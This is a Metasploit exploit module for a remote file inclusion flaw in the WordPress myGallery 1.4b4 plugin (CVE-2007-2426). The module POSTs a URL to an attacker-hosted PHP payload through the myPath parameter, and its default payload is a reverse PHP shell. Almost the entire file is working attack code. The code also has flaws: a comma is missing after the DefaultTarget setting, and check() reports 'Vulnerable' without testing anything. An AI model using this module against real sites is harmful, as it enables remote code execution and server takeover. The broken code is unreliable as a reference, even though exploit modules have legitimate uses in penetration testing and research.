##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
# myGallery <= 1.4.b4 Remote File Include Vulnerablity
# Source Code: http://www.wildbits.de/usr_files/mygallery_1.4b4.zip
# Vulnerable Code: (myfunctions/mygallerybrowser.php:6)
# ------------------------------------------------------------------------------
# if (!$_POST){
# 	$mypath=$_GET['myPath']; <--------[+]
# 
# }
# else {
# 	$mypath=$_POST['myPath']; <--------[+]
# 	
# 	
# }
# require_once($mypath.'/wp-config.php'); <--------[+]
# ------------------------------------------------------------------------------
###
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  # This module sends remote including URL through HTTP GET request.
  include Msf::Exploit::Remote::HttpClient

  # Hosting a PHP server to provide webshell.
  include Msf::Exploit::Remote::HttpServer::PHPInclude

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress myGallery <= 1.4b4 Remote File Inclusion',
        'Description' => %q{
          PHP remote file inclusion vulnerability in myfunctions/mygallerybrowser.php
          in the myGallery 1.4b4 and earlier plugin for WordPress allows remote
          attackers to execute arbitrary PHP code via a URL in the myPath parameter.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'goudunz1 <goudunz1@outlook.com>' ],
        'References' => [
          [ 'EDB', '3814' ],
          [ 'CVE', '2007-2426']
        ],
        'DisclosureDate' => '2007-04-29',
        'Privileged' => false,
        'Payload' => {
          'DisableNops' => true,
          'Compat' => {
            'ConnectionType' => 'find'
          }
        },
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Targets' => [
          [
            'Automatic',
            { }
          ]
        ],
        'DefaultTarget' => 0
        'DefaultOptions' => {
          'PAYLOAD' => 'php/reverse_php'
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The full URI path to WordPress', '/']),
        OptString.new('PLUGINSPATH', [true, 'The relative path to the plugins folder', 'wp-content/plugins/'])
      ]
    )
  end

  def check
    CheckCode::Vulnerable
  end

  def php_exploit
    uri = target_uri.path
    uri << '/'
    uri << datastore['PLUGINSPATH']

    print_status('Sending request, takes no more than 3 seconds')
    res = send_request_cgi({
        'method' => 'POST',
        'uri' => "#{uri}/mygallery/myfunctions/mygallerybrowser.php",
        'data' => "myPath=#{php_include_url}"
      }, timeout=3)

    if res
      if res.body =~ /allow_url_include/
        fail_with(Failure::NotVulnerable, 'allow_url_include is disabled')
      elsif res.code != 200
        fail_with(Failure::UnexpectedReply, "Unexpected reply - #{res.code}")
      else
        fail_with(Failure::PayloadFailed, 'Payload delivered but ignored')
      end
    else
      print_good("Seems like we did it")
    end
  end
end
